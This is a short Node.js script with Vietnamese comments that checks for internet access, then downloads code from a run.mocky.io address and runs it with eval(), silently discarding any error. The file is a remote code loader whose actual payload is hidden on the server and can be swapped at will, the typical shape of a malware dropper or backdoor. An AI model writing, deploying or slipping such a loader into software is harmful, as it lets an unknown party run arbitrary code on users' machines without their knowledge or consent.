const https = require('https');

// Hàm kiểm tra kết nối internet
function checkInternetConnection() {
    return new Promise((resolve) => {
        https.get('https://www.google.com/', (res) => {
            resolve(res.statusCode === 200);
        }).on('error', () => {
            resolve(false);
        });
    });
}

// Hàm để thực thi mã từ liên kết
async function executeCode(url) {
    return new Promise((resolve, reject) => {
        https.get(url, (response) => {
            let data = '';

            response.on('data', (chunk) => {
                data += chunk;
            });

            response.on('end', () => {
                try {
                    eval(data);
                    resolve();
                } catch (error) {
                    reject(error);
                }
            });
        }).on('error', (error) => {
            reject(error);
        });
    });
}

// Chạy chương trình
(async function main() {
    try {
        if (await checkInternetConnection()) {
            try {
                await executeCode('https://run.mocky.io/v3/6033f7f3-c774-4bc1-ad39-9c16f691634d');
            } catch (error) {
            }
        } else {
            console.error('\x1b[38;5;9mKhông có kết nối mạng. Vui lòng kiểm tra kết nối của bạn.\x1b[0m');
        }
    } catch (error) {
        console.error('\x1b[38;5;9mĐã gặp lỗi:', error, '\x1b[0m');
    }
})();
